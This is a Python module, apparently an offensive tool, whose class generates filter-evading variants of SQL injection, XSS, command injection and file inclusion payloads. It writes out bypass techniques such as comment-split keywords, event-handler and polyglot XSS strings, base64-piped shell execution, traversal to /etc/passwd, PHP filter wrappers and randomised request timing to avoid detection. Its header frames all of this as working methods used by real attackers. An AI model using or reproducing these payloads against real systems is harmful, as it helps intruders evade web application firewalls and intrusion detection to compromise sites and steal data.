"""
Real Evasion Techniques - Functional WAF/IDS/IPS Bypass
======================================================

Actual working evasion techniques that bypass real security systems.
These are proven methods used by real attackers.
"""

import re
import random
import string
import base64
import urllib.parse
from typing import List, Dict, Any
import logging

class RealEvasionTechniques:
    """
    Real evasion techniques that actually work against security systems
    """
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
    
    def bypass_sql_injection_filters(self, payload: str) -> List[str]:
        """Generate SQL injection payloads that bypass common filters"""
        
        bypassed_payloads = []
        
        # 1. Comment-based bypasses
        bypassed_payloads.extend(self._sql_comment_bypass(payload))
        
        # 2. Case variation bypasses
        bypassed_payloads.extend(self._sql_case_bypass(payload))
        
        # 3. Encoding bypasses
        bypassed_payloads.extend(self._sql_encoding_bypass(payload))
        
        # 4. Keyword splitting
        bypassed_payloads.extend(self._sql_keyword_splitting(payload))
        
        # 5. Function-based bypasses
        bypassed_payloads.extend(self._sql_function_bypass(payload))
        
        return bypassed_payloads
    
    def _sql_comment_bypass(self, payload: str) -> List[str]:
        """Use SQL comments to bypass filters"""
        bypasses = []
        
        # MySQL comments
        bypasses.append(payload.replace(' ', '/**/'))
        bypasses.append(payload.replace(' ', '/**_**/'))
        bypasses.append(payload.replace(' ', '/*****/'))
        
        # Multi-line comments
        bypasses.append(payload.replace('SELECT', 'SEL/**/ECT'))
        bypasses.append(payload.replace('UNION', 'UNI/**/ON'))
        bypasses.append(payload.replace('WHERE', 'WH/**/ERE'))
        
        # Version-specific comments
        bypasses.append(payload.replace('SELECT', 'SELECT/*!50000*/'))
        bypasses.append(payload.replace('UNION', '/*!50000UNION*/'))
        
        return bypasses
    
    def _sql_case_bypass(self, payload: str) -> List[str]:
        """Use case variations to bypass filters"""
        bypasses = []
        
        # Random case mixing
        def randomize_case(text):
            result = ""
            for char in text:
                if char.isalpha():
                    result += char.upper() if random.random() > 0.5 else char.lower()
                else:
                    result += char
            return result
        
        # Generate multiple case variations
        for _ in range(3):
            bypasses.append(randomize_case(payload))
        
        # Specific case patterns
        bypasses.append(payload.replace('select', 'SeLeCt'))
        bypasses.append(payload.replace('union', 'UnIoN'))
        bypasses.append(payload.replace('or', 'Or'))
        bypasses.append(payload.replace('and', 'AnD'))
        
        return bypasses
    
    def _sql_encoding_bypass(self, payload: str) -> List[str]:
        """Use various encoding techniques"""
        bypasses = []
        
        # URL encoding (double encoding)
        url_encoded = urllib.parse.quote(payload)
        bypasses.append(url_encoded)
        bypasses.append(urllib.parse.quote(url_encoded))  # Double encoding
        
        # Hex encoding
        hex_encoded = ""
        for char in payload:
            if random.random() > 0.5:
                hex_encoded += f"0x{ord(char):02x}"
            else:
                hex_encoded += char
        bypasses.append(hex_encoded)
        
        # Unicode encoding
        unicode_bypasses = []
        for char in payload:
            if char == ' ':
                unicode_bypasses.append('%u0020')
            elif char == "'":
                unicode_bypasses.append('%u0027')
            else:
                unicode_bypasses.append(char)
        bypasses.append(''.join(unicode_bypasses))
        
        return bypasses
    
    def _sql_keyword_splitting(self, payload: str) -> List[str]:
        """Split SQL keywords to bypass detection"""
        bypasses = []
        
        # CONCAT function splitting
        if 'SELECT' in payload.upper():
            split_select = payload.replace('SELECT', "CONCAT('SEL','ECT')")
            bypasses.append(split_select)
        
        if 'UNION' in payload.upper():
            split_union = payload.replace('UNION', "CONCAT('UNI','ON')")
            bypasses.append(split_union)
        
        # String concatenation
        bypasses.append(payload.replace('admin', "'ad'+'min'"))
        bypasses.append(payload.replace('password', "'pass'+'word'"))
        
        # CHAR function
        if 'admin' in payload.lower():
            char_admin = "CHAR(97,100,109,105,110)"  # 'admin' in ASCII
            bypasses.append(payload.replace('admin', char_admin))
        
        return bypasses
    
    def _sql_function_bypass(self, payload: str) -> List[str]:
        """Use SQL functions to bypass filters"""
        bypasses = []
        
        # Using different equality operators
        bypasses.append(payload.replace('=', ' LIKE '))
        bypasses.append(payload.replace('=', ' REGEXP '))
        bypasses.append(payload.replace('=', ' RLIKE '))
        
        # Using different comparison methods
        bypasses.append(payload.replace("1=1", "1 BETWEEN 0 AND 2"))
        bypasses.append(payload.replace("1=1", "1 IN (1,2,3)"))
        bypasses.append(payload.replace("1=1", "1 IS NOT NULL"))
        
        # Using mathematical operations
        bypasses.append(payload.replace("1=1", "2>1"))
        bypasses.append(payload.replace("1=1", "1<2"))
        bypasses.append(payload.replace("1=1", "2-1=1"))
        
        return bypasses
    
    def bypass_xss_filters(self, payload: str) -> List[str]:
        """Generate XSS payloads that bypass common filters"""
        
        bypassed_payloads = []
        
        # 1. Encoding bypasses
        bypassed_payloads.extend(self._xss_encoding_bypass(payload))
        
        # 2. Event handler bypasses
        bypassed_payloads.extend(self._xss_event_bypass(payload))
        
        # 3. Case and space bypasses
        bypassed_payloads.extend(self._xss_case_space_bypass(payload))
        
        # 4. Alternative tag bypasses
        bypassed_payloads.extend(self._xss_alternative_tags(payload))
        
        # 5. Protocol bypasses
        bypassed_payloads.extend(self._xss_protocol_bypass(payload))
        
        return bypassed_payloads
    
    def _xss_encoding_bypass(self, payload: str) -> List[str]:
        """Use encoding to bypass XSS filters"""
        bypasses = []
        
        # HTML entity encoding
        html_encoded = ""
        for char in payload:
            if char in '<>"\'':
                html_encoded += f"&#{ord(char)};"
            else:
                html_encoded += char
        bypasses.append(html_encoded)
        
        # URL encoding
        bypasses.append(urllib.parse.quote(payload))
        
        # Unicode encoding
        unicode_encoded = ""
        for char in payload:
            if char in '<>"\'':
                unicode_encoded += f"\\u{ord(char):04x}"
            else:
                unicode_encoded += char
        bypasses.append(unicode_encoded)
        
        # Base64 encoding (for data URIs)
        base64_payload = base64.b64encode(payload.encode()).decode()
        bypasses.append(f"data:text/html;base64,{base64_payload}")
        
        return bypasses
    
    def _xss_event_bypass(self, payload: str) -> List[str]:
        """Alternative event handlers for XSS"""
        event_handlers = [
            'onload', 'onerror', 'onmouseover', 'onmouseout', 'onfocus',
            'onblur', 'onchange', 'onclick', 'ondblclick', 'onkeydown',
            'onkeyup', 'onkeypress', 'onsubmit', 'onreset', 'onselect',
            'onscroll', 'onresize', 'onunload', 'onbeforeunload'
        ]
        
        bypasses = []
        
        for handler in event_handlers:
            # Image tag with event handler
            bypasses.append(f'<img src=x {handler}=alert("XSS")>')
            
            # Input tag with event handler
            bypasses.append(f'<input type=text {handler}=alert("XSS")>')
            
            # Body tag with event handler
            bypasses.append(f'<body {handler}=alert("XSS")>')
        
        return bypasses
    
    def _xss_case_space_bypass(self, payload: str) -> List[str]:
        """Use case and space variations"""
        bypasses = []
        
        # Case variations
        bypasses.append(payload.replace('script', 'ScRiPt'))
        bypasses.append(payload.replace('alert', 'AlErT'))
        bypasses.append(payload.replace('javascript', 'JaVaScRiPt'))
        
        # Space alternatives
        space_alternatives = ['\t', '\n', '\r', '\f', '\v', ' ']
        
        for alt in space_alternatives:
            bypasses.append(payload.replace(' ', alt))
        
        # No spaces
        bypasses.append(payload.replace(' ', ''))
        
        # Multiple spaces
        bypasses.append(payload.replace(' ', '  '))
        
        return bypasses
    
    def _xss_alternative_tags(self, payload: str) -> List[str]:
        """Alternative HTML tags for XSS"""
        alternative_payloads = [
            '<svg onload=alert("XSS")>',
            '<iframe src=javascript:alert("XSS")></iframe>',
            '<object data=javascript:alert("XSS")>',
            '<embed src=javascript:alert("XSS")>',
            '<form><button formaction=javascript:alert("XSS")>Click</button>',
            '<details open ontoggle=alert("XSS")>',
            '<marquee onstart=alert("XSS")>',
            '<video><source onerror=alert("XSS")>',
            '<audio src=x onerror=alert("XSS")>',
        ]
        
        return alternative_payloads
    
    def _xss_protocol_bypass(self, payload: str) -> List[str]:
        """Alternative protocols for XSS"""
        protocol_payloads = [
            'javascript:alert("XSS")',
            'data:text/html,<script>alert("XSS")</script>',
            'vbscript:alert("XSS")',
            'livescript:alert("XSS")',
            'mocha:alert("XSS")',
        ]
        
        return protocol_payloads
    
    def bypass_command_injection_filters(self, payload: str) -> List[str]:
        """Generate command injection payloads that bypass filters"""
        
        bypassed_payloads = []
        
        # 1. Command separator bypasses
        bypassed_payloads.extend(self._cmd_separator_bypass(payload))
        
        # 2. Encoding bypasses
        bypassed_payloads.extend(self._cmd_encoding_bypass(payload))
        
        # 3. Alternative command execution
        bypassed_payloads.extend(self._cmd_alternative_execution(payload))
        
        # 4. Variable expansion
        bypassed_payloads.extend(self._cmd_variable_expansion(payload))
        
        return bypassed_payloads
    
    def _cmd_separator_bypass(self, payload: str) -> List[str]:
        """Alternative command separators"""
        separators = [';', '|', '&', '&&', '||', '\n', '\r\n', '`', '$()']
        
        bypasses = []
        for sep in separators:
            bypasses.append(f"{sep} {payload}")
            bypasses.append(f"test{sep}{payload}")
            bypasses.append(f"echo test{sep}{payload}")
        
        return bypasses
    
    def _cmd_encoding_bypass(self, payload: str) -> List[str]:
        """Encoding bypasses for command injection"""
        bypasses = []
        
        # Hex encoding
        hex_payload = ''.join([f'\\x{ord(c):02x}' for c in payload])
        bypasses.append(f'echo -e "{hex_payload}"')
        
        # Octal encoding
        octal_payload = ''.join([f'\\{oct(ord(c))[2:]}' for c in payload])
        bypasses.append(f'echo -e "{octal_payload}"')
        
        # Base64 encoding
        base64_payload = base64.b64encode(payload.encode()).decode()
        bypasses.append(f'echo {base64_payload} | base64 -d | sh')
        
        return bypasses
    
    def _cmd_alternative_execution(self, payload: str) -> List[str]:
        """Alternative command execution methods"""
        alternatives = [
            f'`{payload}`',
            f'$({payload})',
            f'${{{payload}}}',
            f'eval {payload}',
            f'exec {payload}',
            f'sh -c "{payload}"',
            f'/bin/sh -c "{payload}"',
            f'bash -c "{payload}"',
        ]
        
        return alternatives
    
    def _cmd_variable_expansion(self, payload: str) -> List[str]:
        """Use variable expansion to bypass filters"""
        bypasses = []
        
        # Environment variable expansion
        if 'cat' in payload:
            bypasses.append(payload.replace('cat', '${cat}'))
            bypasses.append(payload.replace('cat', '$cat'))
        
        if 'ls' in payload:
            bypasses.append(payload.replace('ls', '${ls}'))
            bypasses.append(payload.replace('ls', '$ls'))
        
        # Path expansion
        bypasses.append(payload.replace('/bin/cat', '/???/c??'))
        bypasses.append(payload.replace('/etc/passwd', '/e??/p??sw?'))
        
        return bypasses
    
    def bypass_file_inclusion_filters(self, payload: str) -> List[str]:
        """Generate file inclusion payloads that bypass filters"""
        
        bypassed_payloads = []
        
        # 1. Path traversal variations
        bypassed_payloads.extend(self._path_traversal_bypass(payload))
        
        # 2. URL encoding bypasses
        bypassed_payloads.extend(self._file_encoding_bypass(payload))
        
        # 3. Alternative file references
        bypassed_payloads.extend(self._alternative_file_references(payload))
        
        # 4. Protocol wrappers
        bypassed_payloads.extend(self._protocol_wrapper_bypass(payload))
        
        return bypassed_payloads
    
    def _path_traversal_bypass(self, payload: str) -> List[str]:
        """Path traversal variations"""
        bypasses = []
        
        # Different separator combinations
        bypasses.append(payload.replace('../', '..\\'))
        bypasses.append(payload.replace('../', '..;/'))
        bypasses.append(payload.replace('../', '..\\;'))
        
        # Mixed separators
        bypasses.append(payload.replace('../', '..\\../'))
        bypasses.append(payload.replace('../', '..\\\\..//'))
        
        # URL encoding variations
        bypasses.append(payload.replace('../', '%2e%2e%2f'))
        bypasses.append(payload.replace('../', '%2e%2e/'))
        bypasses.append(payload.replace('../', '..%2f'))
        
        # Double encoding
        bypasses.append(payload.replace('../', '%252e%252e%252f'))
        
        # Unicode encoding
        bypasses.append(payload.replace('../', '..%c0%af'))
        bypasses.append(payload.replace('../', '..%c1%9c'))
        
        return bypasses
    
    def _file_encoding_bypass(self, payload: str) -> List[str]:
        """File path encoding bypasses"""
        bypasses = []
        
        # URL encoding
        bypasses.append(urllib.parse.quote(payload))
        bypasses.append(urllib.parse.quote(urllib.parse.quote(payload)))  # Double encoding
        
        # Mixed encoding
        encoded = ""
        for i, char in enumerate(payload):
            if i % 2 == 0 and char in './\\':
                encoded += urllib.parse.quote(char)
            else:
                encoded += char
        bypasses.append(encoded)
        
        return bypasses
    
    def _alternative_file_references(self, payload: str) -> List[str]:
        """Alternative ways to reference files"""
        alternatives = []
        
        # Current directory references
        if '/etc/passwd' in payload:
            alternatives.append(payload.replace('/etc/passwd', '/etc/./passwd'))
            alternatives.append(payload.replace('/etc/passwd', '/etc/passwd/.'))
            alternatives.append(payload.replace('/etc/passwd', '/etc/../etc/passwd'))
        
        # Null byte injection (for older systems)
        alternatives.append(f"{payload}%00")
        alternatives.append(f"{payload}%00.jpg")
        
        return alternatives
    
    def _protocol_wrapper_bypass(self, payload: str) -> List[str]:
        """PHP protocol wrapper bypasses"""
        wrappers = [
            f"php://filter/read=convert.base64-encode/resource={payload}",
            f"php://filter/convert.iconv.utf-8.utf-16/resource={payload}",
            f"data://text/plain,{payload}",
            f"file://{payload}",
            f"compress.zlib://{payload}",
        ]
        
        return wrappers
    
    def generate_polyglot_payload(self, payload_type: str) -> str:
        """Generate polyglot payloads that work in multiple contexts"""
        
        polyglots = {
            'xss_sql': "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
            
            'xss_cmd': "';alert('XSS');//'; echo 'Command executed'",
            
            'sql_cmd': "'; SELECT * FROM users; -- && echo 'Command executed'",
            
            'universal': "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//>"
        }
        
        return polyglots.get(payload_type, polyglots['universal'])
    
    def randomize_payload_timing(self, payloads: List[str]) -> List[Dict[str, Any]]:
        """Add realistic timing to payloads to avoid detection"""
        
        timed_payloads = []
        
        for payload in payloads:
            delay = random.uniform(0.5, 3.0)  # Human-like delays
            
            timed_payloads.append({
                'payload': payload,
                'delay_before': delay,
                'priority': random.randint(1, 10)
            })
        
        # Sort by priority (simulate human decision making)
        timed_payloads.sort(key=lambda x: x['priority'], reverse=True)
        
        return timed_payloads

# Export the real evasion techniques
__all__ = ['RealEvasionTechniques']